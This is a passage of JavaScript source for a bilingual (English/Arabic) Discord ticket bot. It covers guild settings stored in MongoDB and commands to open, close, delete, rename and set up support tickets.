const Discord = require("discord.js");
const client = new Discord.Client({ disableEveryone: false });
const mong = require("./dashboard/untiles/mongoose.js"); mong.init();
const mongoose = require('mongoose');
const Guildsettings = require('./dashboard/models/guild.js');
const GuildTranscripts = require('./dashboard/models/transcript.js');
const GuildPanels = require('./dashboard/models/GuildPanels.js');
// const config = require(`./config.json`);
const dash = require(`./dashboard/settings.json`);
const colors = require("colors");
const Enmap = require("enmap");
client.settings = new Enmap({ name: "settings", dataDir: "./databases/settings" });

client.login(process.env.token);
const fs = require("fs");;
const moment = require("moment");
const countdown = require('countdown');
const { measureMemory } = require("vm");
const { ENGINE_METHOD_PKEY_ASN1_METHS, SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION, EMULTIHOP, DH_CHECK_P_NOT_PRIME, SSL_OP_DONT_INSERT_EMPTY_FRAGMENTS } = require("constants");
const { start } = require("repl");
const { settings } = require("cluster");
const e = require("express");
const { lang } = require("moment");
const { notStrictEqual } = require("assert");
const SSS = require('./dashboard/settings.json');
const ms = require("ms");
const { count } = require("console");
const { type } = require("os");
/////////////////////////
let RoomID = '678081103084650515'; // حط هنا ايدي روم عشان يسجل فيه كل التكتات الي تنحذف بره عن السرفر وتقدر تشوف التكتات الي تسجلت من البوت
////////////////////////
let NoTicketChannel = new Discord.MessageEmbed().setColor('RED')
    .setDescription(`:x: **Can't get the ticket info about this channel!**\nPlease make sure this is a ticket channel`);

const blacklist = JSON.parse(fs.readFileSync('./blacklist.json', 'utf8'));
client.on('error', console.error);
client.on('warn', warn => console.warn(`[WARN] - ${warn}`));
process.on('unhandledRejection', (reason, promise) => { console.log('[Error]:', reason.stack || reason); });
let Gprefix = '='; let uptime; let cooldown = {}; let RedC = '#9b0000';
client.on('ready', async () => {
    require("./dashboard/index.js")(client);
    client.user.setActivity(`${SSS.statu}`, { type: "PLAYING" });
    console.log(`=========================`)
    console.log(`Ready!!`)
    console.log(`Logged in as ${client.user.tag}!`)
    console.log(`servers! [ " ${client.guilds.cache.size} " ]`);
    console.log(`Developed By Darwin (ID:627133526072098857)`); uptime = Date.now();
    console.log(`=========================`);

});
client.on("message", async message => {
    if (message.author.bot || message.channel.type == "dm" || !message.channel.guild) return;
    let args = message.content.split(" ");
    Guildsettings.findOne({
        guildID: message.guild.id
    }, async (err, guild) => {
        if (err) console.error(err);
        if (!guild) {
            console.log(`[${message.guild.name}] wasn't in my database! so i added it :)`)
            const newGuild = new Guildsettings({
                _id: mongoose.Types.ObjectId(),
                guildID: message.guild.id,
                prefix: Gprefix,
                category: null,
                suprole: null,
                log: null,
                transcript: null,
                count: 0,
                prv: 3,
                disable: null,
                limit: 0,
                auto: "off",
                tickets: [],
                ReactionMessages: [],
                lang: "en",
            });
            await newGuild.save();
        }

        GuildTranscripts.findOne({
            channelID: message.channel.id
        }, async (err, TRanss) => {
            let aliase = { command: null }; // كانت اضافه ل اختصار الاوامر بس شلتها في الملف الي نشرته لكم عشانه مب مستقر
            let settings = guild;
            if (!settings) return;
            let prefix = settings.prefix;
            if (message.content == `<@${client.user.id}>` || message.content == `<@!${client.user.id}>`) return message.channel.send(`My Prefix In This Guild Is \`${prefix}\`!`);
            if (message.content.startsWith(prefix + 'prefix')) {
                if (!message.member.hasPermission('MANAGE_GUILD')) return;
                if (!args[1]) return message.channel.send(`Please Type The New Server Prefix!`);
                if (args[1].length > 2) return message.channel.send(`**The Prefix length Can't Be More Than \`2\`**!`);
                settings.updateOne({ prefix: `${args[1]}` }).then(result => { })
                return message.channel.send(`☑️ **The New Server Prefix Set To \`${args[1]}\`**!`);
            };
            if (message.content.startsWith(prefix + 'lang')) {
                if (!message.member.hasPermission('MANAGE_GUILD')) return;
                if (!args[1]) return message.channel.send(`**available Languages**: **ar**, **en**`);
                if (!['en', 'ar'].includes(args[1])) return message.channel.send(`**available Languages**: **ar**, **en**`);
                let RR;
                if (args[1] == 'ar') { args = '☑️ **تم تغير اللغة الي العربية**!'; RR = 'ar' }
                if (args[1] == 'en') { args = '☑️ **Server language Set to English**!'; RR = 'en' }
                settings.updateOne({ lang: RR }).then(result => { });
                return message.channel.send(args);
            };

            if (message.content == prefix + 'uptime') {
                return message.channel.send(`**☑️ Starts From: \`${countdown(uptime).toString()}\`**`);
            }

            if (message.content == prefix + 'help' || message.content == Gprefix + 'help') {
                let EmBeD = new Discord.MessageEmbed().setColor(`BLUE`)
                    .setTitle('<:email:828955522283208774> Tickets Commands')
                    .setDescription(`\`{}\` is a required argument. \`[]\` is an optional argument.\n** **`)// settings
                    .addField('Setup..', '`setup`, `setcat {category name/id}`, `setrole {role name/id}`, `setlog {channel name/id}`, `settrans {channel name/id}`')
                    .addField('Reaction Tickets Setup', '`tr setup`, `tr msg`, `tr emoji`, `tr color`')
                    .addField('Open a Ticket', '`new [member]`')
                    .addField('In Ticket Commands', '`close`, `reopen`, `delete`, `rename {name}`, `save`, `add {user}`,\n`remove {user}`')
                    .addField(
                        'Management Commands',
                        "`autosave`, `prv`,`tickets toggle`, `tickets {close/rename} toggle`,\n `config`, `limit`, `emoji {close,delete,reopen,save,claim} {emoji}`,\n `emoji {reset}` ")
                    .addField('Claming Commands', '`claim settings`')
                    .addField('Other Commands', '`lang {ar/en}`,\n`count reset`, `tickets reset`, `history {user/time/reset}`')
                message.reply(EmBeD).catch(err => null)
            }
            //             if (message.content == `${prefix}invite`) {
            //                 return message.author.send(new Discord.MessageEmbed().setColor('#00dcff')
            //                     .addField('⚪ **INVITE LINK**', `
            // [Click Here](https://discordapp.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot)`, true)
            //                     .setFooter(`${client.user.username}`)).catch(err => null)
            //             }
            if (message.content.startsWith(prefix + "new") || aliase.command == 'new') {
                if (!message.guild.member(client.user).hasPermission("MANAGE_CHANNELS"))
                    return message.channel.send(
                        `**Error** :octagonal_sign:\nI Don\'t have MANAGE_CHANNELS Permission to do this`
                    ); let M = message.author;

                if (message.mentions.members.first()) {
                    if (message.member.hasPermission('MANAGE_CHANNELS') || message.member.roles.cache.find(g => g.id === settings.suprole)
                    ) M = message.mentions.members.first();
                }

                if (settings.disable == '1' || settings.disable == '3') {
                    if (settings.lang == 'ar') { return message.channel.send("**هذا الأمر غير مفعل**"); } else return message.channel.send("the tickets command in **OFF**!");
                }
                if (blacklist[message.guild.id + M.id]) {
                    if (settings.lang == 'ar') { return message.reply('😣 انت في القائمه السوداء'); } else return message.reply('😣 Blacklist');
                }
                if (settings.limit !== "0") {
                    let C = 0
                    message.guild.channels.cache.forEach(c => {
                        if (c.topic == M.id) C++
                    });
                    if (C >= settings.limit) {
                        if (settings.lang == 'ar') { return message.channel.send(`**لا يمكنك فتح اكثر من \`${C}\` نذكره**`); } else return message.channel.send(`**You can't create more than \`${C}\` ticket**`);
                    }
                }
                let Reason = message.content
                    .split(" ")
                    .slice(1)
                    .join(" ");
                if (!Reason) Reason = "NONE";
                New(message.channel, M, Reason, prefix, settings);
            }
            if (message.content.startsWith(prefix + "setrole")) {
                if (!message.member.hasPermission("MANAGE_GUILD")) return; let l = message.content.split(" ").length - 1;
                let role = message.guild.roles.cache.find(r => r.id == message.content.split(" ")[l] || r.name == message.content.split(" ").slice(l).join(" ")) || message.mentions.roles.first();

                if (!role) {
                    if (settings.lang == 'ar') return message.channel.send(`**لم استطع العثور علي هذه الرتبة**`)
                    return message.channel.send("**Please Check the Role ID**!");
                }

                settings.updateOne({ suprole: `${role.id}` }).then(result => { });
                if (settings.lang == 'ar') return message.channel.send(
                    new Discord.MessageEmbed()
                        .setAuthor(message.author.username, message.author.avatarURL)
                        .setColor(64189)
                        .setTitle("**تم حفظ تغييراتك بنجاح** ✅")
                        .setDescription(`**\n** **تم تغير رتبة الدعم الفني الي: ${role}**`)
                        .setFooter(message.guild.name, `https://cdn.discordapp.com/icons/${message.guild.id}//${message.guild.icon}.png?size=1024`)
                        .setTimestamp()
                );
                message.channel.send(
                    new Discord.MessageEmbed()
                        .setAuthor(message.author.username, message.author.avatarURL)
                        .setColor(64189)
                        .setTitle("Your Changes Has been saved ✅")
                        .setDescription(`**\n** **Set The Manage Role to: ${role}**`)
                        .setFooter(message.guild.name, `https://cdn.discordapp.com/icons/${message.guild.id}//${message.guild.icon}.png?size=1024`)
                        .setTimestamp()
                );
            }

            if (message.content.startsWith(prefix + `add`) || aliase.command == 'add') {
                if (!TRanss) {
                    if (settings.lang == 'ar') return message.channel.send(new Discord.MessageEmbed()
                        .setDescription(`:x: **لم يتم التعرف علي هذه التذكره!**`)
                        .setColor('RED'))
                    return message.channel.send(new Discord.MessageEmbed()
                        .setDescription(`:x: **Can't get the ticket info about this channel!**\nPlease make sure this is a ticket channel`)
                        .setColor('RED'))
                }
                if (!message.guild.member(client.user).hasPermission("MANAGE_CHANNELS"))
                    return message.channel.send(
                        `**Error** :octagonal_sign:\nI Don\'t have MANAGE_CHANNELS Permission to do this`
                    );
                if (!message.member.hasPermission('MANAGE_CHANNELS')) {
                    if (!message.member.roles.cache.find(g => g.id === settings.suprole)) {
                        if (settings.lang == 'ar') return message.channel.send("**ليس لديك صلاحيات هذا الأمر**");
                        return message.channel.send("You Can't run This Command");
                    }
                }
                if (TRanss.statu == 'close') {
                    if (settings.lang == 'ar') return message.channel.send(`> **التذكره مغلقة**`)
                    return message.channel.send(`> **Ticket Closed**`)
                }

                let member = message.mentions.members.first() || await message.guild.members.fetch(`${message.content.split(" ")[1]}`).catch(err => null)
                if (!member) {
                    if (settings.lang == 'ar') return message.channel.send(`**لا يمكنني العثور على هذا العضو :rolling_eyes:**`);
                    return message.channel.send(`**I Can't find This Member :rolling_eyes:**`);
                }
                if (
                    message.channel.permissionsFor(member).has(["SEND_MESSAGES", "VIEW_CHANNEL", "READ_MESSAGE_HISTORY"])) {
                    if (settings.lang == 'ar') return message.channel.send(`هذا العضو في التذكره من قبل :rolling_eyes:`);
                    return message.channel.send(`this member already in this ticket :rolling_eyes:`);
                }
                message.channel.updateOverwrite(member.id, {
                    SEND_MESSAGES: true,
                    VIEW_CHANNEL: true,
                    READ_MESSAGE_HISTORY: true,
                    ATTACH_FILES: true
                });
                if (settings.lang == 'ar') {
                    message.channel.send(`**✅ تم\nتم اضافه \`${member.user.tag}\` الي التذكره**`)
                } else message.channel.send(`**Done ✅\nSuccessfully added \`${member.user.tag}\` to the ticket**`);
                let xx = new Discord.MessageEmbed()
                    .setColor(`BLUE`)
                    .setTitle(`Member added To a Tickets`)
                    .setDescription(`Member : ${member}\nTicket : #${message.channel.name}\nby :${message.author}`)
                    .setTimestamp()
                    .setThumbnail(`http://i8.ae/HSPHw`)
                    .setFooter(message.author.id);
                if (settings.lang == 'ar') xx = new Discord.MessageEmbed()
                    .setColor(`BLUE`)
                    .setTitle(`اضافه عضو الي تذكره`)
                    .setDescription(`العضو : ${member}\nالتذكره : #${message.channel.name}\nبواسطة :${message.author}`)
                    .setTimestamp()
                    .setThumbnail(`http://i8.ae/HSPHw`)
                    .setFooter(message.author.id);
                if (settings.log !== null) {
                    let log = await client.channels.fetch(`${settings.log}`);
                    if (log) log.send({ embed: xx }).catch(err => null);
                }
            }
            if (message.content.startsWith(prefix + `remove`) || aliase.command == 'remove') {
                if (!TRanss) {
                    if (settings.lang == 'ar') return message.channel.send(new Discord.MessageEmbed()
                        .setDescription(`:x: **لم يتم التعرف علي هذه التذكره!**`)
                        .setColor('RED'))
                    return message.channel.send(new Discord.MessageEmbed()
                        .setDescription(`:x: **Can't get the ticket info about this channel!**\nPlease make sure this is a ticket channel`)
                        .setColor('RED'))
                }
                if (!message.guild.member(client.user).hasPermission("MANAGE_CHANNELS"))
                    return message.channel.send(
                        `**Error** :octagonal_sign:\nI Don\'t have MANAGE_CHANNELS Permission to do this`
                    );

                if (!message.member.hasPermission('MANAGE_CHANNELS')) {
                    if (!message.member.roles.cache.find(g => g.id === settings.suprole)) {
                        if (settings.lang == 'ar') return message.channel.send("**ليس لديك صلاحيات هذا الأمر**");
                        return message.channel.send("You Can't run This Command");
                    }
                }
                if (TRanss.statu == 'close') {
                    if (settings.lang == 'ar') return message.channel.send(`> **التذكره مغلقة**`)
                    return message.channel.send(`> **Ticket Closed**`)
                }
                let member = message.mentions.members.first() || await message.guild.members.fetch(`${message.content.split(" ")[1]}`).catch(err => null)
                if (!member) {
                    if (settings.lang == 'ar') return message.channel.send(`**لا يمكنني العثور على هذا العضو :x:**`);
                    return message.channel.send(`**I Can't find This Member :rolling_eyes:**`);
                }
                if (!message.channel.permissionsFor(member).has(["VIEW_CHANNEL"])
                ) {
                    if (settings.lang == 'ar') return message.channel.send(`:rolling_eyes: **${member.user.tag}** ليس في هذه التذكره`);
                    return message.channel.send(`:rolling_eyes: **${member.user.tag}** is not in this ticket to remove him`);
                }



                message.channel.updateOverwrite(member.id, {
                    VIEW_CHANNEL: false,
                }); if (settings.lang == 'ar') {
                    message.channel.send(`**✅ تم\nتم ازالة \`${member.user.tag}\` من التذكره**`)
                } else message.channel.send(`**Done ✅\nSuccessfully removed \`${member.user.tag}\` from the ticket**`);
                let xx = new Discord.MessageEmbed()
                    .setColor(`BLUE`)
                    .setTitle(`Member removed from a Tickets`)
                    .setDescription(`Member : ${member}\nTicket : #${message.channel.name}\nby :${message.author}`)
                    .setTimestamp()
                    .setThumbnail(`http://i8.ae/HSPHw`)
                    .setFooter(message.author.id);
                if (settings.lang == 'ar') xx = new Discord.MessageEmbed()
                    .setColor(`BLUE`)
                    .setTitle(`ازالة عضو من التذكره`)
                    .setDescription(`العضو : ${member}\nالتذكره : #${message.channel.name}\nبواسظة :${message.author}`)
                    .setTimestamp()
                    .setThumbnail(`http://i8.ae/HSPHw`)
                    .setFooter(message.author.id);
                if (settings.log !== null) {
                    let log = await client.channels.fetch(`${settings.log}`);
                    if (log) log.send({ embed: xx }).catch(err => null);
                }
            }

            if (message.content.startsWith(prefix + "close") || aliase.command == 'close') {
                if (!message.member.hasPermission('MANAGE_CHANNELS')) {
                    if (!message.member.roles.cache.find(g => g.id === settings.suprole)) {
                        if (!settings.close || settings.close == '1') return;
                    }
                }
                if (!TRanss) {
                    if (settings.lang == 'ar') return message.channel.send(new Discord.MessageEmbed()
                        .setDescription(`:x: **لم يتم التعرف علي هذه التذكره!**`)
                        .setColor('RED'))
                    return message.channel.send(new Discord.MessageEmbed()
                        .setDescription(`:x: **Can't get the ticket info about this channel!**\nPlease make sure this is a ticket channel`)
                        .setColor('RED'))
                }
                if (TRanss.statu == 'close') {
                    if (settings.lang == 'ar') return message.channel.send(`> **التذكره مغلقة**`)
                    return message.channel.send(`> **Ticket Closed**`)
                }
                let sourse = TRanss;
                if (sourse.clsmsg !== null) return;
                sourse.members.forEach(async id => {
                    await client.channels.cache.find(g => g.id === message.channel.id).updateOverwrite(id, {
                        VIEW_CHANNEL: false
                    }).catch(err => null)
                });
                message.delete().catch(err => null)
                ClsMSG(settings, message, TRanss)

            }
            if (message.content.startsWith(prefix + "delete") || aliase.command == 'delete') {
                let args = message.content.split(" ").slice(1).join(" ");
                if (args == "all") {
                    if (!message.member.hasPermission("MANAGE_GUILD")) return;
                    if (!message.guild.member(client.user).hasPermission("MANAGE_CHANNELS"))
                        return message.channel.send(
                            `**Error** :octagonal_sign:\nI Don\'t have MANAGE_CHANNELS Permission to do this`
                        );
                    let Com = 'are you sure you want to delete all the tickets? type (y) to comfirm'
                    if (settings.lang == 'ar') Com = 'هل انت متأكد من مسح كل التذاكر؟ قم بكتابه (y) لتأكيد المسح'
                    message.channel.send(`**${Com}**`)
                        .then(async msg1 => {
                            var response = await message.channel.awaitMessages(msg2 => msg2.author.id === message.author.id, {
                                max: 1, time: 40000, errors: ['time']
                            });
                            response.first().delete().catch(err => null);
                            if (response.first().content == 'y') {
                                message.guild.channels.cache
                                    .forEach(channel => {
                                        GuildTranscripts.findOne({
                                            channelID: channel.id
                                        }, async (err, TT) => {
                                            if (err) console.error(err);
                                            if (!TT) return;
                                            channel.delete().catch(err => null);
                                            //////////////////////////////////////////////////////////////
                                            //              ممكن يسوي تعليق او كراش لو فيه اكثر من 15 تكت
                                            if (settings.auto == '2') {
                                                let u = await client.users.fetch(channel.topic); if (!u) return;
                                                Save(channel, u || 'null', message.author.id, settings, 'autoBulk');
                                            }
                                            //////////////////////////////////////////////////////////////
                                        });
                                    });
                                let xx = new Discord.MessageEmbed()
                                    .setColor(`RED`)
                                    .setTitle(`Bulk Tickets Delete`)
                                    .setDescription(`by :${message.author}`)
                                    .setTimestamp()
                                    .setThumbnail(`http://i8.ae/HSPHw`)
                                    .setFooter(message.author.id);
                                if (settings.lang == 'ar') xx = new Discord.MessageEmbed()
                                    .setColor(`RED`)
                                    .setTitle(`مسح جميع التذاكر`)
                                    .setDescription(`بواسطة :${message.author}`)
                                    .setTimestamp()
                                    .setThumbnail(`http://i8.ae/HSPHw`)
                                    .setFooter(message.author.id);
                                if (settings.log !== null) {
                                    let log = await client.channels.fetch(`${settings.log}`);
                                    if (log) log.send({ embed: xx }).catch(err => null);
                                }
                                msg1.delete().catch(err => null)
                                if (settings.lang == 'ar') {
                                    message.channel.send(new Discord.MessageEmbed().setColor('GREEN').setTitle('**تم مسح جميع التذاكر :white_check_mark:**'))
                                } else return message.channel.send(new Discord.MessageEmbed().setColor('GREEN').setTitle("**all Tickets channels has been Deleted :white_check_mark:**"))
                            } else msg1.edit(`**:x: Cancel**`)
                        }); return
                }
                if (!TRanss) {
                    if (settings.lang == 'ar') return message.channel.send(new Discord.MessageEmbed()
                        .setDescription(`:x: **لم يتم التعرف علي هذه التذكره!**`)
                        .setColor('RED'))
                    return message.channel.send(new Discord.MessageEmbed()
                        .setDescription(`:x: **Can't get the ticket info about this channel!**\nPlease make sure this is a ticket channel`)
                        .setColor('RED'))
                }
                if (!message.guild.member(client.user).hasPermission("MANAGE_CHANNELS"))
                    return message.channel.send(
                        `**Error** :octagonal_sign:\nI Don\'t have MANAGE_CHANNELS Permission to do this`
                    );
                if (!message.member.hasPermission('MANAGE_CHANNELS')) {
                    if (!message.member.roles.cache.find(g => g.id === settings.suprole)) {
                        if (!settings.close || settings.close == '1') return;
                    }
                }
                if (settings.lang == 'ar') {
                    message.channel.send(new Discord.MessageEmbed().setDescription(`سيتم مسح التذكره خلاص 5 ثواني`).setColor(RedC))
                } else message.channel.send(new Discord.MessageEmbed().setDescription(`Ticket will delete in 5s`).setColor(RedC))
                if (settings.auto == '2') {
                    Save(message.channel, message.author || 'null', message.author.id || 'null', settings, 'auto')
                }
                if (settings.prv == '2') {
                    let XC = message.guild.members.cache.find(t => t.id == message.channel.topic)
                    if (XC !== null && XC !== undefined) { if (XC.id) Save(message.channel, XC, XC.id, settings, 'prv'); }
                }
                setTimeout(() => {
                    Close(message.channel, message.author, settings)
                }, 5000);
            }
            if (message.content.startsWith(prefix + "reopen") || aliase.command == 'reopen') {
                if (!message.member.hasPermission('MANAGE_CHANNELS')) {
                    if (!message.member.roles.cache.find(g => g.id === settings.suprole)) return message.channel.send(
                        "You Can't run This Command");
                }
                if (!TRanss) return message.channel.send(new Discord.MessageEmbed()
                    .setDescription(`:x: **Can't get the ticket info about this channel!**\nPlease make sure this is a ticket channel`)
                    .setColor('RED'));
                if (TRanss.statu !== 'close') return message.channel.send(new Discord.MessageEmbed().setColor("RED")
                    .setDescription(`This ticket have not been closed yet!`)
                );
                let embed2 = new Discord.MessageEmbed()
                    .setColor(`GREEN`)
                    .setTitle(`Ticket re-opened`)
                    .setDescription(`Ticket : #${message.channel.name}\nby :<@${message.author.id}>`)
                    .setTimestamp()
                    .setThumbnail(`http://i8.ae/HSPHw`)
                    .setFooter(message.author.id);
                if (settings.log !== null) {
                    let log = await client.channels.fetch(`${settings.log}`);
                    if (log) log.send({ embed: embed2 });
                }
                if (TRanss.clsmsg !== null) message.channel.messages.fetch(TRanss.clsmsg).then(MM => MM.delete().catch(err => null)); message.delete().catch(err => null);
                message.channel.send(new Discord.MessageEmbed().setColor('GREEN').setDescription(`Ticket reopend by <@${message.author.id}>`));
                TRanss.members.forEach(id => {
                    message.channel.updateOverwrite(id, {
                        VIEW_CHANNEL: true
                    }); TRanss.updateOne({ statu: 'open', clsmsg: null, t: 'false', tp: 'false' }).then(result => { })

                });
            }
            if (message.content.startsWith(prefix + "rename") || aliase.command == 'rename') {
                if (!message.member.hasPermission('MANAGE_CHANNELS')) {
                    if (!message.member.roles.cache.find(g => g.id === settings.suprole)) {
                        if (!settings.rename || settings.rename == '1') return;
                    }
                }
                if (!TRanss) return message.channel.send(NoTicketChannel);
                if (!message.guild.member(client.user).hasPermission("MANAGE_CHANNELS"))
                    return message.channel.send(
                        `**Error** :octagonal_sign:\nI Don\'t have MANAGE_CHANNELS Permission to do this`
                    );
                let args = message.content
                    .split(" ")
                    .slice(1)
                    .join(" ");
                if (!args) return message.channel.send("Please Type the New channel name");
                message.channel.setName(`${args}`);
                message.channel.send(`**✅ The Ticket Name Set To: \`${args}\`**`);
            }
            if (message.content == prefix + "tickets reset") {
                if (!message.member.hasPermission("MANAGE_GUILD")) return;
                message.channel.send(`**are you sure you want to reset all the settings? type (y) to comfirm**`)
                    .then(async msg1 => {
                        var response = await message.channel.awaitMessages(msg2 => msg2.author.id === message.author.id, {
                            max: 1, time: 40000, errors: ['time']
                        });
                        response.first().delete().catch(err => null);
                        if (response.first().content == 'y') {
                            settings.updateOne({
                                category: null,
                                suprole: null,
                                log: null,
                                transcript: null,
                                count: 0,
                                prv: 3,
                                disable: null,
                                limit: 0,
                                auto: "off",
                                tickets: [],
                                ReactionMessages: [],
                                lang: "en",
                            }).then(result => { })
                            msg1.edit("**✅ All Tickets Data has been reset**");
                        } else msg1.edit(`**:x: Cancel**`)
                    });
            }
            if (message.content == prefix + 'setup') {
                if (!message.member.hasPermission("MANAGE_GUILD")) return;
                let embed = new Discord.MessageEmbed().setColor('GREEN');
                let CHN; let ROle; let LOG;
                message.channel.send(embed.setAuthor(`1-`).setDescription(
                    `**please type the category name/id that will tickets open under it\nor type "skip" to skip**`)
                ).then(async msg1 => {
                    var response = await message.channel.awaitMessages(msg2 => msg2.author.id === message.author.id, {
                        max: 1, time: 40000, errors: ['time']
                    });
                    response.first().delete().catch(err => null);
                    if (response.first().content !== 'skip') {
                        let channel = message.guild.channels.cache.find(ch => ch.id == response.first().content && ch.type == 'category') || message.guild.channels.cache.find(ch => ch.name == response.first().content && ch.type == 'category');
                        if (!channel) { message.channel.send(`**:x: I Can't find a category with this name or id \`${response.first().content}\`!**`); return msg1.delete().catch(err => null); }
                        CHN = channel.id;
                    }
                    msg1.edit(embed.setAuthor(`2-`).setDescription(`✅ ${CHN || ''}\n**please type the role name/id that can see and manage the ticket**`)).catch(err => null);

                    var response = await message.channel.awaitMessages(msg2 => msg2.author.id === message.author.id, {
                        max: 1, time: 40000, errors: ['time']
                    });
                    response.first().delete().catch(err => null);
                    let role = message.guild.roles.cache.find(ch => ch.id == response.first().content || message.guild.roles.cache.find(ch => ch.name == response.first().content));
                    if (!role) {
                        message.channel.send(`**:x: I Can't find a role with this name or id \`${response.first().content}\`!**`);
                        return msg1.delete().catch(err => null);
                    }
                    ROle = role.id
                    msg1.edit(embed.setAuthor(`3-`).setDescription(`✅ ${ROle || ' '}\n**please type the logging channel name/id\nor type "skip" to skip**`)).catch(err => null);
                    var response = await message.channel.awaitMessages(msg2 => msg2.author.id === message.author.id, {
                        max: 1, time: 40000, errors: ['time']
                    });
                    response.first().delete().catch(err => null);
                    if (response.first().content !== 'skip') {
                        let channel = message.guild.channels.cache.find(ch => ch.id == response.first().content && ch.type == 'text') || message.guild.channels.cache.find(ch => ch.name == response.first().content && ch.type == 'text');
                        if (!channel) { message.channel.send(`**:x: I Can't find a text channel with this name or id \`${response.first().content}\`!**`); return msg1.delete().catch(err => null); }
                        LOG = channel.id;
                    }
                    msg1.edit(embed.setAuthor(`✅ All Done`).setDescription(`The setup finished!`))
                    settings.updateOne({
                        category: CHN,
                        suprole: ROle,
                        log: LOG,
                        transcript: LOG
                    }).then(result => { })
                })
            }
            if (message.content == prefix + 'setup q') {
                if (!message.member.hasPermission("MANAGE_GUILD")) return;
                if (!message.guild.member(client.user).hasPermission("MANAGE_CHANNELS")
                    || !message.guild.member(client.user).hasPermission("MANAGE_ROLES"))
                    return message.channel.send(`**Error** :octagonal_sign:\nI Don\'t have Permissions to do this`);

                // if(message.guild.roles.cache.find(r => r.id == settings.suprole)) return message.channel.send(`
                // **☑️ the setup allready done**`)
                message.guild.channels.create(`TICKETS`, { type: 'category', reason: 'Quickly Setup' }).then(category => {
                    message.guild.channels.create(`Tickets logging`, {
                        type: 'text', parent: category.id, reason: 'Quickly Setup',
                        permissionOverwrites: [{
                            id: message.guild.id,
                            deny: ['VIEW_CHANNEL']
                        }]
                    }).then(logg => {
                        message.guild.roles.create({ data: { name: 'Support', color: '#ff4d4d' } }).then(role => {
                            message.guild.channels.create(`Tickets Transcript`, {
                                type: 'text', parent: category.id, reason: 'Quickly Setup',
                                permissionOverwrites: [{
                                    id: message.guild.id,
                                    deny: ['VIEW_CHANNEL']
                                }]
                            }).then(trans => {
                                message.channel.send(new Discord.MessageEmbed().setTitle(`☑️ Setup Successfully`).setDescription(
                                    `**☑️ Category Channel ${category}\n☑️ logging Channel ${logg}\n☑️ Transcript Channel ${trans}\n☑️ Support role ${role}**`).setColor('GREEN'));
                                settings.updateOne({
                                    category: category.id,
                                    suprole: role.id,
                                    log: logg.id,
                                    transcript: trans.id
                                }).then(result => { })
                            });
                        });
                    });
                });
                return;
            }
            if (message.content == prefix + 'tr setup') {
                if (!message.member.hasPermission("MANAGE_GUILD")) return;
                if (!message.guild.member(client.user).hasPermission("MANAGE_CHANNELS")
                    || !message.guild.member(client.user).hasPermission("MANAGE_ROLES"))
                    return message.channel.send(`**Error** :octagonal_sign:\nI Don\'t have Permissions to do this`);
                message.guild.channels.create(`Create a Ticket`, {
                    type: 'text', reason: 'Quickly Reation Setup',
                    permissionOverwrites: [{ id: message.guild.id, allow: ['VIEW_CHANNEL'], deny: ['SEND_MESSAGES'] }]
                })
                    .then(async CH => {
                        await CH.send(new Discord.MessageEmbed().setDescription(`To create a ticket react with 📧`).setColor('GREEN')
                            .setFooter(`${client.user.username}`, `https://cdn.discordapp.com/avatars/${client.user.id}/${client.user.avatar}.png?size=1024`)
                            .setAuthor(`${message.guild.name}`, `https://cdn.discordapp.com/icons/${message.channel.guild.id}/${message.channel.guild.icon}.png`)
                        ).then(mm => {
                            mm.react('📧');
                            settings.updateOne({ ReactionMessage: mm.id, ReactionEmoji: '📧', ReactionCannel: CH.id }).then(result => { });
                            message.channel.send(new Discord.MessageEmbed().setDescription(`:white_check_mark: Successfully setup the reaction tickets
[jump To The Message](https://discord.com/channels/${message.guild.id}/${CH.id}/${mm.id})`
                            ).setColor('GREEN'))
                        });

                    });


                return;
            }
            if (message.content.startsWith(prefix + 'tr msg')) {
                if (!message.member.hasPermission("MANAGE_GUILD")) return;
                if (!args[2]) return message.channel.send(`**:x: Please Type the new Creation Message**`)
                let embed = new Discord.MessageEmbed().setColor(`RED`)
                    .setDescription(`**It looks like you haven't setup the ReactionTickets yet!**\nType: \`${prefix}tr setup\` to setup it`)
                if (settings.ReactionCannel == null) return message.channel.send(embed);
                let CHH = await message.guild.channels.cache.find(t => t.id == settings.ReactionCannel);
                if (!CHH) return message.channel.send(embed);
                CHH.messages.fetch(settings.ReactionMessage).then(MM => {
                    if (MM) {
                        if (MM.id) {
                            if (!MM.embeds[0]) return message.channel.send(embed);
                            MM.edit(MM.embeds[0].setDescription(`${message.content.split(" ").slice(2).join(" ")}`)).then(() => {
                                return message.channel.send(new Discord.MessageEmbed().setColor(`GREEN`)
                                    .setDescription(`**✅ Successfully Saved**`))
                            }).catch(err => null)
                        }
                    }
                }).catch(err => { return message.channel.send(embed) })
            }
            if (message.content.startsWith(prefix + 'tr color')) {
                if (!message.member.hasPermission("MANAGE_GUILD")) return;
                if (!args[2]) return message.channel.send(`**:x: Please Type the new Creation Message Color**`)
                let embed = new Discord.MessageEmbed().setColor(`RED`)
                    .setDescription(`**It looks like you haven't setup the ReactionTickets yet!**\nType: \`${prefix}tr setup\` to setup it`)
                if (settings.ReactionCannel == null) return message.channel.send(embed);
                let CHH = await message.guild.channels.cache.find(t => t.id == settings.ReactionCannel);
                if (!CHH) return message.channel.send(embed);
                CHH.messages.fetch(settings.ReactionMessage).then(MM => {
                    if (MM) {
                        if (MM.id) {
                            if (!MM.embeds[0]) return message.channel.send(embed);
                            MM.edit(MM.embeds[0].setColor(`${message.content.split(" ").slice(2).join(" ")}`)).then(() => {
                                return message.channel.send(new Discord.MessageEmbed()
                                    .setDescription(`**✅ Successfully Saved**`).setColor(args[2]))
                            }).catch(err => null)
                        }
                    }
                }).catch(err => { return message.channel.send(embed) })
            }
            if (message.content.startsWith(prefix + 'tr emoji')) {
                if (!message.member.hasPermission("MANAGE_GUILD")) return;
                if (!args[2]) return message.channel.send(`**:x: Please Type the new Creation Emoji**`);
                let embed = new Discord.MessageEmbed().setColor(`RED`)
                    .setDescription(`**It looks like you haven't setup the ReactionTickets yet!**\nType: \`${prefix}tr setup\` to setup it`)
                if (settings.ReactionCannel == null) return message.channel.send(embed);
                let CHH = await message.guild.channels.cache.find(t => t.id == settings.ReactionCannel);
                if (!CHH) return message.channel.send(embed);
                CHH.messages.fetch(settings.ReactionMessage).then(async MM => {
                    if (MM) {
                        if (MM.id) {
                            let emoji;
                            if (args[2].startsWith('<:') || args[2].startsWith('<a:')) {
                                let em = args[2].split("<:")[1] || args[2].split("<a:")[1]; console.log(em)
                                emoji = em.split('>')[0]
                            } else { emoji = args[2] }
                            await MM.react(emoji)
                                .then(M => {
